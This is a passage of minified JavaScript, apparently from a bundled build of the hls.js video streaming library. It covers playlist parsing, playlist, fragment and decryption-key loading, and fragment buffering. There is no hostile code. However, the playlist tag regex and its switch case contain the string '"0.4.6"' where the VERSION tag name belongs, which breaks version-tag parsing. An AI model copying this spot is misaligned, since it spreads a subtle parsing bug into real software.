n="on"+t.replace("hls","");if("function"!=typeof this[n])throw new Error("Event "+t+" has no generic handler in this "+this.constructor.name+" class (tried "+n+")");return this[n].bind(this,r)}).call(this,t,r).call()}catch(e){F.logger.error("An internal error happened while handling event "+t+'. Error message: "'+e.message+'". Here is a stacktrace:',e),this.hls.trigger(M.default.ERROR,{type:A.ErrorTypes.OTHER_ERROR,details:A.ErrorDetails.INTERNAL_EXCEPTION,fatal:!1,event:t,err:e})}},e}(),i=R;!function(e){e.MANIFEST="manifest",e.LEVEL="level",e.AUDIO_TRACK="audioTrack",e.SUBTITLE_TRACK="subtitleTrack"}(m||(m={})),function(e){e.MAIN="main",e.AUDIO="audio",e.SUBTITLE="subtitle"}(a||(a={}));var w=e("./src/demux/mp4demuxer.js");function O(e,t){for(var r=0;r<t.length;r++){var n=t[r];n.enumerable=n.enumerable||!1,n.configurable=!0,"value"in n&&(n.writable=!0),Object.defineProperty(e,n.key,n)}}var f,P=function(){function e(e,t){this._uri=null,this.baseuri=void 0,this.reluri=void 0,this.method=null,this.key=null,this.iv=null,this.baseuri=e,this.reluri=t}return function L(e,t,r){return t&&O(e.prototype,t),r&&O(e,r),e}(e,[{key:"uri",get:function e(){return!this._uri&&this.reluri&&(this._uri=Object(n.buildAbsoluteURL)(this.baseuri,this.reluri,{alwaysNormalize:!0})),this._uri}}]),e}();function N(e,t){for(var r=0;r<t.length;r++){var n=t[r];n.enumerable=n.enumerable||!1,n.configurable=!0,"value"in n&&(n.writable=!0),Object.defineProperty(e,n.key,n)}}!function(e){e.AUDIO="audio",e.VIDEO="video"}(f||(f={}));var I=function(){function e(){var e;this._url=null,this._byteRange=null,this._decryptdata=null,this._elementaryStreams=((e={})[f.AUDIO]=!1,e[f.VIDEO]=!1,e),this.deltaPTS=0,this.rawProgramDateTime=null,this.programDateTime=null,this.title=null,this.tagList=[],this.cc=void 0,this.type=void 0,this.relurl=void 0,this.baseurl=void 0,this.duration=void 0,this.start=void 0,this.sn=0,this.urlId=0,this.level=0,this.levelkey=void 0,this.loader=void 0}var t=e.prototype;return t.setByteRange=function e(t,r){var n=t.split("@",2),i=[];1===n.length?i[0]=r?r.byteRangeEndOffset:0:i[0]=parseInt(n[1]),i[1]=parseInt(n[0])+i[0],this._byteRange=i},t.addElementaryStream=function e(t){this._elementaryStreams[t]=!0},t.hasElementaryStream=function e(t){return!0===this._elementaryStreams[t]},t.createInitializationVector=function e(t){for(var r=new Uint8Array(16),n=12;n<16;n++)r[n]=t>>8*(15-n)&255;return r},t.setDecryptDataFromLevelKey=function e(t,r){var n=t;return(null==t?void 0:t.method)&&t.uri&&!t.iv&&((n=new P(t.baseuri,t.reluri)).method=t.method,n.iv=this.createInitializationVector(r)),n},function H(e,t,r){return t&&N(e.prototype,t),r&&N(e,r),e}(e,[{key:"url",get:function e(){return!this._url&&this.relurl&&(this._url=Object(n.buildAbsoluteURL)(this.baseurl,this.relurl,{alwaysNormalize:!0})),this._url},set:function e(t){this._url=t}},{key:"byteRange",get:function e(){return this._byteRange?this._byteRange:[]}},{key:"byteRangeStartOffset",get:function e(){return this.byteRange[0]}},{key:"byteRangeEndOffset",get:function e(){return this.byteRange[1]}},{key:"decryptdata",get:function e(){if(!this.levelkey&&!this._decryptdata)return null;if(!this._decryptdata&&this.levelkey){var t=this.sn;"number"!=typeof t&&(this.levelkey&&"AES-128"===this.levelkey.method&&!this.levelkey.iv&&F.logger.warn('missing IV for initialization segment with method="'+this.levelkey.method+'" - compliance issue'),t=0),this._decryptdata=this.setDecryptDataFromLevelKey(this.levelkey,t)}return this._decryptdata}},{key:"endProgramDateTime",get:function e(){if(null===this.programDateTime)return null;if(!Object(x.isFiniteNumber)(this.programDateTime))return null;var t=Object(x.isFiniteNumber)(this.duration)?this.duration:0;return this.programDateTime+1e3*t}},{key:"encrypted",get:function e(){return!(!this.decryptdata||null===this.decryptdata.uri||null!==this.decryptdata.key)}}]),e}();function z(e,t){for(var r=0;r<t.length;r++){var n=t[r];n.enumerable=n.enumerable||!1,n.configurable=!0,"value"in n&&(n.writable=!0),Object.defineProperty(e,n.key,n)}}var W=function(){function e(e){this.endCC=0,this.endSN=0,this.fragments=[],this.initSegment=null,this.live=!0,this.needSidxRanges=!1,this.startCC=0,this.startSN=0,this.startTimeOffset=null,this.targetduration=0,this.totalduration=0,this.type=null,this.url=e,this.version=null}return function $(e,t,r){return t&&z(e.prototype,t),r&&z(e,r),e}(e,[{key:"hasProgramDateTime",get:function e(){return!(!this.fragments[0]||!Object(x.isFiniteNumber)(this.fragments[0].programDateTime))}}]),e}(),q=/^(\d+)x(\d+)$/,X=/\s*(.+?)\s*=((?:\".*?\")|.*?)(?:,|$)/g,Z=function(){function r(e){for(var t in"string"==typeof e&&(e=r.parseAttrList(e)),e)e.hasOwnProperty(t)&&(this[t]=e[t])}var e=r.prototype;return e.decimalInteger=function e(t){var r=parseInt(this[t],10);return r>Number.MAX_SAFE_INTEGER?1/0:r},e.hexadecimalInteger=function e(t){if(this[t]){var r=(this[t]||"0x").slice(2);r=(1&r.length?"0":"")+r;for(var n=new Uint8Array(r.length/2),i=0;i<r.length/2;i++)n[i]=parseInt(r.slice(2*i,2*i+2),16);return n}return null},e.hexadecimalIntegerAsNumber=function e(t){var r=parseInt(this[t],16);return r>Number.MAX_SAFE_INTEGER?1/0:r},e.decimalFloatingPoint=function e(t){return parseFloat(this[t])},e.enumeratedString=function e(t){return this[t]},e.decimalResolution=function e(t){var r=q.exec(this[t]);if(null!==r)return{width:parseInt(r[1],10),height:parseInt(r[2],10)}},r.parseAttrList=function e(t){var r,n={};for(X.lastIndex=0;null!==(r=X.exec(t));){var i=r[2];0===i.indexOf('"')&&i.lastIndexOf('"')===i.length-1&&(i=i.slice(1,-1)),n[r[1]]=i}return n},r}(),D=Z,Q={audio:{a3ds:!0,"ac-3":!0,"ac-4":!0,alac:!0,alaw:!0,dra1:!0,"dts+":!0,"dts-":!0,dtsc:!0,dtse:!0,dtsh:!0,"ec-3":!0,enca:!0,g719:!0,g726:!0,m4ae:!0,mha1:!0,mha2:!0,mhm1:!0,mhm2:!0,mlpa:!0,mp4a:!0,"raw ":!0,Opus:!0,samr:!0,sawb:!0,sawp:!0,sevc:!0,sqcp:!0,ssmv:!0,twos:!0,ulaw:!0},video:{avc1:!0,avc2:!0,avc3:!0,avc4:!0,avcp:!0,drac:!0,dvav:!0,dvhe:!0,encv:!0,hev1:!0,hvc1:!0,mjp2:!0,mp4v:!0,mvc1:!0,mvc2:!0,mvc3:!0,mvc4:!0,resv:!0,rv60:!0,s263:!0,svc1:!0,svc2:!0,"vc-1":!0,vp08:!0,vp09:!0}};function d(e,t){return MediaSource.isTypeSupported((t||"video")+'/mp4;codecs="'+e+'"')}var ee=/(?:#EXT-X-STREAM-INF:([^\n\r]*)[\r\n]+([^\r\n]+)|#EXT-X-SESSION-DATA:([^\n\r]*)[\r\n]+)/g,te=/#EXT-X-MEDIA:(.*)/g,re=new RegExp([/#EXTINF:\s*(\d*(?:\.\d+)?)(?:,(.*)\s+)?/.source,/|(?!#)([\S+ ?]+)/.source,/|#EXT-X-BYTERANGE:*(.+)/.source,/|#EXT-X-PROGRAM-DATE-TIME:(.+)/.source,/|#.*/.source].join(""),"g"),ne=/(?:(?:#(EXTM3U))|(?:#EXT-X-(PLAYLIST-TYPE):(.+))|(?:#EXT-X-(MEDIA-SEQUENCE): *(\d+))|(?:#EXT-X-(TARGETDURATION): *(\d+))|(?:#EXT-X-(KEY):(.+))|(?:#EXT-X-(START):(.+))|(?:#EXT-X-(ENDLIST))|(?:#EXT-X-(DISCONTINUITY-SEQ)UENCE:(\d+))|(?:#EXT-X-(DIS)CONTINUITY))|(?:#EXT-X-("0.4.6"):(\d+))|(?:#EXT-X-(MAP):(.+))|(?:(#)([^:]*):(.*))|(?:(#)(.*))(?:.*)\r?\n?/,ie=/\.(mp4|m4s|m4v|m4a)$/i,y=function(){function f(){}return f.findGroup=function e(t,r){for(var n=0;n<t.length;n++){var i=t[n];if(i.id===r)return i}},f.convertAVC1ToAVCOTI=function e(t){var n,r=t.split(".");return r.length>2?(n=r.shift()+".",n+=parseInt(r.shift()).toString(16),n+=("000"+parseInt(r.shift()).toString(16)).substr(-4)):n=t,n},f.resolve=function e(t,r){return n.buildAbsoluteURL(r,t,{alwaysNormalize:!0})},f.parseMasterPlaylist=function e(t,r){var o,n=[],i={},a=!1;function s(n,i){["video","audio"].forEach((function(t){var r=n.filter((function(e){return function J(e,t){var r=Q[t];return!!r&&!0===r[e.slice(0,4)]}(e,t)}));if(r.length){var e=r.filter((function(e){return 0===e.lastIndexOf("avc1",0)||0===e.lastIndexOf("mp4a",0)}));i[t+"Codec"]=e.length>0?e[0]:r[0],n=n.filter((function(e){return-1===r.indexOf(e)}))}})),i.unknownCodecs=n}for(ee.lastIndex=0;null!=(o=ee.exec(t));)if(o[1]){var l={},u=l.attrs=new D(o[1]);l.url=f.resolve(o[2],r);var c=u.decimalResolution("RESOLUTION");c&&(l.width=c.width,l.height=c.height),l.bitrate=u.decimalInteger("AVERAGE-BANDWIDTH")||u.decimalInteger("BANDWIDTH"),l.name=u.NAME,s([].concat((u.CODECS||"").split(/[ ,]+/)),l),l.videoCodec&&-1!==l.videoCodec.indexOf("avc1")&&(l.videoCodec=f.convertAVC1ToAVCOTI(l.videoCodec)),n.push(l)}else if(o[3]){var d=new D(o[3]);d["DATA-ID"]&&(a=!0,i[d["DATA-ID"]]=d)}return{levels:n,sessionData:a?i:null}},f.parseMasterPlaylistMedia=function e(t,r,n,i){var a;void 0===i&&(i=[]);var s=[],o=0;for(te.lastIndex=0;null!==(a=te.exec(t));){var l=new D(a[1]);if(l.TYPE===n){var u={attrs:l,id:o++,groupId:l["GROUP-ID"],instreamId:l["INSTREAM-ID"],name:l.NAME||l.LANGUAGE,type:n,default:"YES"===l.DEFAULT,autoselect:"YES"===l.AUTOSELECT,forced:"YES"===l.FORCED,lang:l.LANGUAGE};if(l.URI&&(u.url=f.resolve(l.URI,r)),i.length){var c=f.findGroup(i,u.groupId);u.audioCodec=c?c.codec:i[0].codec}s.push(u)}}return s},f.parseLevelPlaylist=function e(t,r,n,i,a){var f,h,p,s=0,o=0,l=new W(r),u=0,c=null,d=new I,v=null;for(re.lastIndex=0;null!==(f=re.exec(t));){var g=f[1];if(g){d.duration=parseFloat(g);var A=(" "+f[2]).slice(1);d.title=A||null,d.tagList.push(A?["INF",g,A]:["INF",g])}else if(f[3]){if(Object(x.isFiniteNumber)(d.duration)){var m=s++;d.type=i,d.start=o,p&&(d.levelkey=p),d.sn=m,d.level=n,d.cc=u,d.urlId=a,d.baseurl=r,d.relurl=(" "+f[3]).slice(1),se(d,c),l.fragments.push(d),c=d,o+=d.duration,d=new I}}else if(f[4]){var y=(" "+f[4]).slice(1);c?d.setByteRange(y,c):d.setByteRange(y)}else if(f[5])d.rawProgramDateTime=(" "+f[5]).slice(1),d.tagList.push(["PROGRAM-DATE-TIME",d.rawProgramDateTime]),null===v&&(v=l.fragments.length);else{if(!(f=f[0].match(ne))){F.logger.warn("No matches on slow regex match for level playlist!");continue}for(h=1;h<f.length&&void 0===f[h];h++);var E=(" "+f[h+1]).slice(1),b=(" "+f[h+2]).slice(1);switch(f[h]){case"#":d.tagList.push(b?[E,b]:[E]);break;case"PLAYLIST-TYPE":l.type=E.toUpperCase();break;case"MEDIA-SEQUENCE":s=l.startSN=parseInt(E);break;case"TARGETDURATION":l.targetduration=parseFloat(E);break;case'"0.4.6"':l.version=parseInt(E);break;case"EXTM3U":break;case"ENDLIST":l.live=!1;break;case"DIS":u++,d.tagList.push(["DIS"]);break;case"DISCONTINUITY-SEQ":u=parseInt(E);break;case"KEY":var _=new D(E),T=_.enumeratedString("METHOD"),S=_.URI,C=_.hexadecimalInteger("IV");if("com.apple.streamingkeydelivery"===(_.KEYFORMAT||"identity")){F.logger.warn("Keyformat com.apple.streamingkeydelivery is not supported");continue}T&&(p=new P(r,S),S&&["AES-128","SAMPLE-AES","SAMPLE-AES-CENC"].indexOf(T)>=0&&(p.method=T,p.key=null,p.iv=C));break;case"START":var O=new D(E).decimalFloatingPoint("TIME-OFFSET");Object(x.isFiniteNumber)(O)&&(l.startTimeOffset=O);break;case"MAP":var L=new D(E);d.relurl=L.URI,L.BYTERANGE&&d.setByteRange(L.BYTERANGE),d.baseurl=r,d.level=n,d.type=i,d.sn="initSegment",l.initSegment=d,(d=new I).rawProgramDateTime=l.initSegment.rawProgramDateTime;break;default:F.logger.warn("line parsed but not handled: "+f)}}}return(d=c)&&!d.relurl&&(l.fragments.pop(),o-=d.duration),l.totalduration=o,l.averagetargetduration=o/l.fragments.length,l.endSN=s-1,l.startCC=l.fragments[0]?l.fragments[0].cc:0,l.endCC=u,!l.initSegment&&l.fragments.length&&l.fragments.every((function(e){return ie.test(e.relurl)}))&&(F.logger.warn("MP4 fragments found but no init segment (probably no MAP, incomplete M3U8), trying to fetch SIDX"),(d=new I).relurl=l.fragments[0].relurl,d.baseurl=r,d.level=n,d.type=i,d.sn="initSegment",l.initSegment=d,l.needSidxRanges=!0),v&&function ae(e,t){for(var r=e[t],n=t-1;n>=0;n--){var i=e[n];i.programDateTime=r.programDateTime-1e3*i.duration,r=i}}(l.fragments,v),l},f}();function se(e,t){e.rawProgramDateTime?e.programDateTime=Date.parse(e.rawProgramDateTime):(null==t?void 0:t.programDateTime)&&(e.programDateTime=t.endProgramDateTime),Object(x.isFiniteNumber)(e.programDateTime)||(e.programDateTime=null,e.rawProgramDateTime=null)}var ue=window.performance,ce=function(r){function g(e){var t;return(t=r.call(this,e,M.default.MANIFEST_LOADING,M.default.LEVEL_LOADING,M.default.AUDIO_TRACK_LOADING,M.default.SUBTITLE_TRACK_LOADING)||this).loaders={},t}!function oe(e,t){e.prototype=Object.create(t.prototype),e.prototype.constructor=e,e.__proto__=t}(g,r),g.canHaveQualityLevels=function e(t){return t!==m.AUDIO_TRACK&&t!==m.SUBTITLE_TRACK},g.mapContextToLevelType=function e(t){switch(t.type){case m.AUDIO_TRACK:return a.AUDIO;case m.SUBTITLE_TRACK:return a.SUBTITLE;default:return a.MAIN}},g.getResponseUrl=function e(t,r){var n=t.url;return void 0!==n&&0!==n.indexOf("data:")||(n=r.url),n};var e=g.prototype;return e.createInternalLoader=function e(t){var r=this.hls.config,n=r.pLoader,i=r.loader,s=new(n||i)(r);return t.loader=s,this.loaders[t.type]=s,s},e.getInternalLoader=function e(t){return this.loaders[t.type]},e.resetInternalLoader=function e(t){this.loaders[t]&&delete this.loaders[t]},e.destroyInternalLoaders=function e(){for(var t in this.loaders){var r=this.loaders[t];r&&r.destroy(),this.resetInternalLoader(t)}},e.destroy=function e(){this.destroyInternalLoaders(),r.prototype.destroy.call(this)},e.onManifestLoading=function e(t){this.load({url:t.url,type:m.MANIFEST,level:0,id:null,responseType:"text"})},e.onLevelLoading=function e(t){this.load({url:t.url,type:m.LEVEL,level:t.level,id:t.id,responseType:"text"})},e.onAudioTrackLoading=function e(t){this.load({url:t.url,type:m.AUDIO_TRACK,level:null,id:t.id,responseType:"text"})},e.onSubtitleTrackLoading=function e(t){this.load({url:t.url,type:m.SUBTITLE_TRACK,level:null,id:t.id,responseType:"text"})},e.load=function e(t){var r=this.hls.config;F.logger.debug("Loading playlist of type "+t.type+", level: "+t.level+", id: "+t.id);var a,s,o,l,n=this.getInternalLoader(t);if(n){var i=n.context;if(i&&i.url===t.url)return F.logger.trace("playlist request ongoing"),!1;F.logger.warn("aborting previous loader for type: "+t.type),n.abort()}switch(t.type){case m.MANIFEST:a=r.manifestLoadingMaxRetry,s=r.manifestLoadingTimeOut,o=r.manifestLoadingRetryDelay,l=r.manifestLoadingMaxRetryTimeout;break;case m.LEVEL:a=0,l=0,o=0,s=r.levelLoadingTimeOut;break;default:a=r.levelLoadingMaxRetry,s=r.levelLoadingTimeOut,o=r.levelLoadingRetryDelay,l=r.levelLoadingMaxRetryTimeout}n=this.createInternalLoader(t);var u={timeout:s,maxRetry:a,retryDelay:o,maxRetryDelay:l},c={onSuccess:this.loadsuccess.bind(this),onError:this.loaderror.bind(this),onTimeout:this.loadtimeout.bind(this)};return F.logger.debug("Calling internal loader delegate for URL: "+t.url),n.load(t,u,c),!0},e.loadsuccess=function e(t,r,n,i){if(void 0===i&&(i=null),n.isSidxRequest)return this._handleSidxRequest(t,n),void this._handlePlaylistLoaded(t,r,n,i);if(this.resetInternalLoader(n.type),"string"!=typeof t.data)throw new Error('expected responseType of "text" for PlaylistLoader');var a=t.data;r.tload=ue.now(),0===a.indexOf("#EXTM3U")?a.indexOf("#EXTINF:")>0||a.indexOf("#EXT-X-TARGETDURATION:")>0?this._handleTrackOrLevelPlaylist(t,r,n,i):this._handleMasterPlaylist(t,r,n,i):this._handleManifestParsingError(t,n,"no EXTM3U delimiter",i)},e.loaderror=function e(t,r,n){void 0===n&&(n=null),this._handleNetworkError(r,n,!1,t)},e.loadtimeout=function e(t,r,n){void 0===n&&(n=null),this._handleNetworkError(r,n,!0)},e._handleMasterPlaylist=function e(t,r,n,i){var a=this.hls,s=t.data,o=g.getResponseUrl(t,n),l=y.parseMasterPlaylist(s,o),u=l.levels,c=l.sessionData;if(u.length){var d=u.map((function(e){return{id:e.attrs.AUDIO,codec:e.audioCodec}})),f=y.parseMasterPlaylistMedia(s,o,"AUDIO",d),h=y.parseMasterPlaylistMedia(s,o,"SUBTITLES"),p=y.parseMasterPlaylistMedia(s,o,"CLOSED-CAPTIONS");if(f.length){var v=!1;f.forEach((function(e){e.url||(v=!0)})),!1===v&&u[0].audioCodec&&!u[0].attrs.AUDIO&&(F.logger.log("audio codec signaled in quality level, but no embedded audio track signaled, create one"),f.unshift({type:"main",name:"main",default:!1,autoselect:!1,forced:!1,id:-1,attrs:{},url:""}))}a.trigger(M.default.MANIFEST_LOADED,{levels:u,audioTracks:f,subtitles:h,captions:p,url:o,stats:r,networkDetails:i,sessionData:c})}else this._handleManifestParsingError(t,n,"no level found in manifest",i)},e._handleTrackOrLevelPlaylist=function e(t,r,n,i){var a=this.hls,s=n.id,o=n.level,l=n.type,u=g.getResponseUrl(t,n),c=Object(x.isFiniteNumber)(s)?s:0,d=Object(x.isFiniteNumber)(o)?o:c,f=g.mapContextToLevelType(n),h=y.parseLevelPlaylist(t.data,u,d,f,c);if(h.tload=r.tload,h.fragments.length){if(l===m.MANIFEST){var p={url:u,details:h};a.trigger(M.default.MANIFEST_LOADED,{levels:[p],audioTracks:[],url:u,stats:r,networkDetails:i,sessionData:null})}if(r.tparsed=ue.now(),h.needSidxRanges){var v=h.initSegment.url;this.load({url:v,isSidxRequest:!0,type:l,level:o,levelDetails:h,id:s,rangeStart:0,rangeEnd:2048,responseType:"arraybuffer"})}else n.levelDetails=h,this._handlePlaylistLoaded(t,r,n,i)}else a.trigger(M.default.ERROR,{type:A.ErrorTypes.NETWORK_ERROR,details:A.ErrorDetails.LEVEL_EMPTY_ERROR,fatal:!1,url:u,reason:"no fragments found in level",level:"number"==typeof n.level?n.level:void 0})},e._handleSidxRequest=function e(t,r){if("string"==typeof t.data)throw new Error("sidx request must be made with responseType of array buffer");var n=w.default.parseSegmentIndex(new Uint8Array(t.data));if(n){var i=n.references,a=r.levelDetails;i.forEach((function(e,t){var r=e.info;if(a){var n=a.fragments[t];0===n.byteRange.length&&n.setByteRange(String(1+r.end-r.start)+"@"+String(r.start))}})),a&&a.initSegment.setByteRange(String(n.moovEndOffset)+"@0")}},e._handleManifestParsingError=function e(t,r,n,i){this.hls.trigger(M.default.ERROR,{type:A.ErrorTypes.NETWORK_ERROR,details:A.ErrorDetails.MANIFEST_PARSING_ERROR,fatal:!0,url:t.url,reason:n,networkDetails:i})},e._handleNetworkError=function e(t,r,n,i){var a,s;void 0===n&&(n=!1),void 0===i&&(i=null),F.logger.info("A network error occured while loading a "+t.type+"-type playlist");var o=this.getInternalLoader(t);switch(t.type){case m.MANIFEST:a=n?A.ErrorDetails.MANIFEST_LOAD_TIMEOUT:A.ErrorDetails.MANIFEST_LOAD_ERROR,s=!0;break;case m.LEVEL:a=n?A.ErrorDetails.LEVEL_LOAD_TIMEOUT:A.ErrorDetails.LEVEL_LOAD_ERROR,s=!1;break;case m.AUDIO_TRACK:a=n?A.ErrorDetails.AUDIO_TRACK_LOAD_TIMEOUT:A.ErrorDetails.AUDIO_TRACK_LOAD_ERROR,s=!1;break;default:s=!1}o&&(o.abort(),this.resetInternalLoader(t.type));var l={type:A.ErrorTypes.NETWORK_ERROR,details:a,fatal:s,url:t.url,loader:o,context:t,networkDetails:r};i&&(l.response=i),this.hls.trigger(M.default.ERROR,l)},e._handlePlaylistLoaded=function e(t,r,n,i){var a=n.type,s=n.level,o=n.id,l=n.levelDetails;if(l&&l.targetduration)if(g.canHaveQualityLevels(n.type))this.hls.trigger(M.default.LEVEL_LOADED,{details:l,level:s||0,id:o||0,stats:r,networkDetails:i});else switch(a){case m.AUDIO_TRACK:this.hls.trigger(M.default.AUDIO_TRACK_LOADED,{details:l,id:o,stats:r,networkDetails:i});break;case m.SUBTITLE_TRACK:this.hls.trigger(M.default.SUBTITLE_TRACK_LOADED,{details:l,id:o,stats:r,networkDetails:i})}else this._handleManifestParsingError(t,n,"invalid target duration",i)},g}(i),de=ce;var he=function(i){function e(e){var t;return(t=i.call(this,e,M.default.FRAG_LOADING)||this).loaders={},t}!function fe(e,t){e.prototype=Object.create(t.prototype),e.prototype.constructor=e,e.__proto__=t}(e,i);var t=e.prototype;return t.destroy=function e(){var t=this.loaders;for(var r in t){var n=t[r];n&&n.destroy()}this.loaders={},i.prototype.destroy.call(this)},t.onFragLoading=function e(t){var r=t.frag,n=r.type,i=this.loaders,a=this.hls.config,s=a.fLoader,o=a.loader;r.loaded=0;var u,c,d,l=i[n];l&&(F.logger.warn("abort previous fragment loader for type: "+n),l.abort()),l=i[n]=r.loader=a.fLoader?new s(a):new o(a),u={url:r.url,frag:r,responseType:"arraybuffer",progressData:!1};var f=r.byteRangeStartOffset,h=r.byteRangeEndOffset;Object(x.isFiniteNumber)(f)&&Object(x.isFiniteNumber)(h)&&(u.rangeStart=f,u.rangeEnd=h),c={timeout:a.fragLoadingTimeOut,maxRetry:0,retryDelay:0,maxRetryDelay:a.fragLoadingMaxRetryTimeout},d={onSuccess:this.loadsuccess.bind(this),onError:this.loaderror.bind(this),onTimeout:this.loadtimeout.bind(this),onProgress:this.loadprogress.bind(this)},l.load(u,c,d)},t.loadsuccess=function e(t,r,n,i){void 0===i&&(i=null);var a=t.data,s=n.frag;s.loader=void 0,this.loaders[s.type]=void 0,this.hls.trigger(M.default.FRAG_LOADED,{payload:a,frag:s,stats:r,networkDetails:i})},t.loaderror=function e(t,r,n){void 0===n&&(n=null);var i=r.frag,a=i.loader;a&&a.abort(),this.loaders[i.type]=void 0,this.hls.trigger(M.default.ERROR,{type:A.ErrorTypes.NETWORK_ERROR,details:A.ErrorDetails.FRAG_LOAD_ERROR,fatal:!1,frag:r.frag,response:t,networkDetails:n})},t.loadtimeout=function e(t,r,n){void 0===n&&(n=null);var i=r.frag,a=i.loader;a&&a.abort(),this.loaders[i.type]=void 0,this.hls.trigger(M.default.ERROR,{type:A.ErrorTypes.NETWORK_ERROR,details:A.ErrorDetails.FRAG_LOAD_TIMEOUT,fatal:!1,frag:r.frag,networkDetails:n})},t.loadprogress=function e(t,r,n,i){void 0===i&&(i=null);var a=r.frag;a.loaded=t.loaded,this.hls.trigger(M.default.FRAG_LOAD_PROGRESS,{frag:a,stats:t,networkDetails:i})},e}(i),pe=he;var ge=function(n){function e(e){var t;return(t=n.call(this,e,M.default.KEY_LOADING)||this).loaders={},t.decryptkey=null,t.decrypturl=null,t}!function ve(e,t){e.prototype=Object.create(t.prototype),e.prototype.constructor=e,e.__proto__=t}(e,n);var t=e.prototype;return t.destroy=function e(){for(var t in this.loaders){var r=this.loaders[t];r&&r.destroy()}this.loaders={},n.prototype.destroy.call(this)},t.onKeyLoading=function e(t){var r=t.frag,n=r.type,i=this.loaders[n];if(r.decryptdata){var a=r.decryptdata.uri;if(a!==this.decrypturl||null===this.decryptkey){var s=this.hls.config;if(i&&(F.logger.warn("abort previous key loader for type:"+n),i.abort()),!a)return void F.logger.warn("key uri is falsy");r.loader=this.loaders[n]=new s.loader(s),this.decrypturl=a,this.decryptkey=null;var o={url:a,frag:r,responseType:"arraybuffer"},l={timeout:s.fragLoadingTimeOut,maxRetry:0,retryDelay:s.fragLoadingRetryDelay,maxRetryDelay:s.fragLoadingMaxRetryTimeout},u={onSuccess:this.loadsuccess.bind(this),onError:this.loaderror.bind(this),onTimeout:this.loadtimeout.bind(this)};r.loader.load(o,l,u)}else this.decryptkey&&(r.decryptdata.key=this.decryptkey,this.hls.trigger(M.default.KEY_LOADED,{frag:r}))}else F.logger.warn("Missing decryption data on fragment in onKeyLoading")},t.loadsuccess=function e(t,r,n){var i=n.frag;i.decryptdata?(this.decryptkey=i.decryptdata.key=new Uint8Array(t.data),i.loader=void 0,delete this.loaders[i.type],this.hls.trigger(M.default.KEY_LOADED,{frag:i})):F.logger.error("after key load, decryptdata unset")},t.loaderror=function e(t,r){var n=r.frag,i=n.loader;i&&i.abort(),delete this.loaders[n.type],this.hls.trigger(M.default.ERROR,{type:A.ErrorTypes.NETWORK_ERROR,details:A.ErrorDetails.KEY_LOAD_ERROR,fatal:!1,frag:n,response:t})},t.loadtimeout=function e(t,r){var n=r.frag,i=n.loader;i&&i.abort(),delete this.loaders[n.type],this.hls.trigger(M.default.ERROR,{type:A.ErrorTypes.NETWORK_ERROR,details:A.ErrorDetails.KEY_LOAD_TIMEOUT,fatal:!1,frag:n})},e}(i),Ae=ge;var B_NOT_LOADED="NOT_LOADED",B_APPENDING="APPENDING",B_PARTIAL="PARTIAL",B_OK="OK",ye=function(r){function e(e){var t;return(t=r.call(this,e,M.default.BUFFER_APPENDED,M.default.FRAG_BUFFERED,M.default.FRAG_LOADED)||this).bufferPadding=.2,t.fragments=Object.create(null),t.timeRanges=Object.create(null),t.config=e.config,t}!function me(e,t){e.prototype=Object.create(t.prototype),e.prototype.constructor=e,e.__proto__=t}(e,r);var t=e.prototype;return t.destroy=function e(){this.fragments=Object.create(null),this.timeRanges=Object.create(null),this.config=null,i.prototype.destroy.call(this),r.prototype.destroy.call(this)},t.getBufferedFrag=function e(n,i){var a=this.fragments,t=Object.keys(a).filter((function(e){var t=a[e];if(t.body.type!==i)return!1;if(!t.buffered)return!1;var r=t.body;return r.startPTS<=n&&n<=r.endPTS}));if(0===t.length)return null;var r=t.pop();return a[r].body},t.detectEvictedFragments=function e(s,o){var l=this;Object.keys(this.fragments).forEach((function(e){var t=l.fragments[e];if(t&&t.buffered){var r=t.range[s];if(r)for(var n=r.time,i=0;i<n.length;i++){var a=n[i];if(!l.isTimeBuffered(a.startPTS,a.endPTS,o)){l.removeFragment(t.body);break}}}}))},t.detectPartialFragments=function e(r){var n=this,t=this.getFragmentKey(r),i=this.fragments[t];i&&(i.buffered=!0,Object.keys(this.timeRanges).forEach((function(e){if(r.hasElementaryStream(e)){var t=n.timeRanges[e];i.range[e]=n.getBufferedTimes(r.startPTS,r.endPTS,t)}})))},t.getBufferedTimes=function e(t,r,n){for(var a,s,i=[],o=!1,l=0;l<n.length;l++){if(a=n.start(l)-this.bufferPadding,s=n.end(l)+this.bufferPadding,t>=a&&r<=s){i.push({startPTS:Math.max(t,n.start(l)),endPTS:Math.min(r,n.end(l))});break}if(t<s&&r>a)i.push({startPTS:Math.max(t,n.start(l)),endPTS:Math.min(r,n.end(l))}),o=!0;else if(r<=a)break}return{time:i,partial:o}},t.getFragmentKey=function e(t){return t.type+"_"+t.level+"_"+t.urlId+"_"+t.sn},t.getPartialFragment=function e(r){var i,a,s,n=this,o=null,l=0;return Object.keys(this.fragments).forEach((function(e){var t=n.fragments[e];n.isPartial(t)&&(a=t.body.startPTS-n.bufferPadding,s=t.body.endPTS+n.bufferPadding,r>=a&&r<=s&&(i=Math.min(r-a,s-r),l<=i&&(o=t.body,l=i)))})),o},t.getState=function e(t){var r=this.getFragmentKey(t),n=this.fragments[r],i=B_NOT_LOADED;return void 0!==n&&(i=n.buffered?!0===this.isPartial(n)?B_PARTIAL:B_OK:B_APPENDING),i},t.isPartial=function e(t){return!0===t.buffered&&(void 0!==t.range.video&&!0===t.range.video.partial||void 0!==t.range.audio&&!0===t.range.audio.partial)},t.isTimeBuffered=function e(t,r,n){for(var i,a,s=0;s<n.length;s++){if(i=n.start(s)-this.bufferPadding,a=n.end(s)+this.bufferPadding,t>=i&&r<=a)return!0;if(r<=i)return!1}return!1},t.onFragLoaded=function e(t){var r=t.frag;Object(x.isFiniteNumber)(r.sn)&&!r.bitrateTest&&(this.fragments[this.getFragmentKey(r)]={body:r,range:Object.create(null),buffered:!1})},t.onBufferAppended=function e(t){var r=this;this.timeRanges=t.timeRanges,Object.keys(this.timeRanges).forEach((function(e){var t=r.timeRanges[e];r.detectEvictedFragments(e,t)}))},t.onFragBuffered=function e(t){this.detectPartialFragments(t.frag)},t.hasFragment=function e(t){var r=this.getFragmentKey(t);return void 0!==this.fragments[r]},t.removeFragment=function e(t){var r=this.getFragmentKey(t);delete this.fragments[r]},t.removeAllFragments=function e(){this.fragments=Object.create(null)},e}(i),U={search:function e(t,r){for(var n=0,i=t.length-1,a=null,s=null;n<=i;){var o=r(s=t[a=(n+i)/2|0]);if(o>0)n=a+1;else{if(!(o<0))return s;i=a-1}}return null}},j=function(){function e(){}return e.isBuffered=function e(t,r){try{if(t)for(var n=t.buffered,i=0;i<n.length;i++)if(r>=n.start(i)&&r<=n.end(i))return!0}catch(e){}return!1},e.bufferInfo=function 